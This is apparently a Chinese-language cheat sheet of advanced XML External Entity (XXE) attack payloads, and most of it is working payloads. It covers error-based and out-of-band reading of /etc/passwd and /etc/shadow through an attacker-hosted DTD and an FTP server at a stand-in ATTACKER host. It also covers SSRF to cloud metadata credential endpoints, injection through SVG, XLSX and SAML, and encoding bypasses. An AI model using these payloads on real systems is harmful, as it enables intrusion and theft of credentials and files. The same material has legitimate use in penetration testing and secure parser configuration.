# XXE 高级利用技术

## 基于错误的 XXE 数据提取（外部 DTD）

无回显时，通过解析错误将文件内容嵌入错误信息。攻击者托管 `malicious.dtd`：

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Payload：`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/malicious.dtd"> %xxe;]>`

## 基于本地 DTD 的错误提取（无外连场景）

禁止出站时，复用系统已有 DTD 文件，重定义其中的参数实体触发错误泄露：

```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &apos;file:///nonexistent/&#x25;file;&apos;>">
    &#x25;eval; &#x25;error;
  '>
  %local_dtd;
]>
```

常见系统 DTD：`/usr/share/yelp/dtd/docbookx.dtd`（GNOME）、`/usr/share/xml/fontconfig/fonts.dtd`。用 dtd-finder 扫描可用 DTD。

## XInclude 攻击（无法控制 DOCTYPE 时）

输入仅插入已有 XML 某个元素中时，无法注入 DOCTYPE，改用 XInclude：

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

## XXE 到 SSRF 链式攻击

`<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">`

目标：AWS `169.254.169.254`、GCP `metadata.google.internal`、内网 `127.0.0.1:8080/admin`。

## 文件上传 XXE

### XLSX

```bash
unzip target.xlsx && vim xl/workbook.xml  # 注入 DOCTYPE+ENTITY
zip -r exploit.xlsx .
```

### SVG（文本回显）

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg" width="300" height="200">
  <text x="0" y="20">&xxe;</text>
</svg>
```

文件内容渲染到图片中，需能访问生成的 SVG 图片。PDF 生成库（wkhtmltopdf 等）解析 XML 时同理可触发。

## SAML 中的 XXE

SAML 断言是 XML，IdP/SP 解析时可触发 XXE。将 DOCTYPE+ENTITY 注入 SAML Response，在 `<saml:Issuer>` 等元素中引用 `&xxe;` 即可。注意保持 SAML namespace 完整。

## 编码绕过技术

### UTF-7

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-xxe+ACA-SYSTEM+ACA-+ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-
+ADw-root+AD4-+ACY-xxe+ADs-+ADw-/root+AD4-
```

### UTF-16

```bash
iconv -f UTF-8 -t UTF-16 payload.xml > payload_utf16.xml
```

### data:// 协议 + Base64

```xml
<!DOCTYPE foo [<!ENTITY % x SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %x;]>
```

### HTML 实体编码嵌套

```xml
<!DOCTYPE foo [
  <!ENTITY % a "&#x3C;&#x21;ENTITY &#x25; dtd SYSTEM &#x22;http://ATTACKER/bypass.dtd&#x22;&#x3E;">
  %a; %dtd;
]>
<data>&exfil;</data>
```

## 解析器行为差异

| 解析器 | 默认外部实体 | 备注 |
|--------|-------------|------|
| libxml2 (Python lxml) | 禁用 | lxml < 5.4.0 即使 `resolve_entities=False` 仍展开参数实体 |
| Java DocumentBuilderFactory | 启用 | 须显式 `disallow-doctype-decl=true` |
| MSXML 3.0 / 6.0 | 3.0 启用，6.0 禁用 | 6.0 需手动设 `ProhibitDTD=true` |
| PHP libxml >= 2.9.0 | 禁用 | 需 `LIBXML_NOENT` 才启用，老版本默认危险 |

### lxml 错误泄露（无需出站）

```xml
<!DOCTYPE foo [
  <!ENTITY % a '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; b "<!ENTITY c SYSTEM &apos;meow://&#x25;file;&apos;>">
  '>
  %a; %b;
]>
<root>&c;</root>
```

解析器尝试 `meow://` 协议失败，错误信息泄露文件内容。

## OOB 外带多行文件（FTP 协议）

HTTP 外带无法获取含换行的内容，FTP 可以：

```xml
<!ENTITY % file SYSTEM "file:///etc/shadow">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://ATTACKER:2121/%file;'>">
%eval;
%exfil;
```

攻击端运行：`ruby xxe-ftp-server.rb 2121`

## Java jar: 协议利用

Java 特有，读取远程 ZIP 内文件时写入 `/tmp/` 临时目录，可配合路径遍历进一步利用：

```xml
<!ENTITY xxe SYSTEM "jar:http://ATTACKER:8080/evil.zip!/payload.dtd">
```
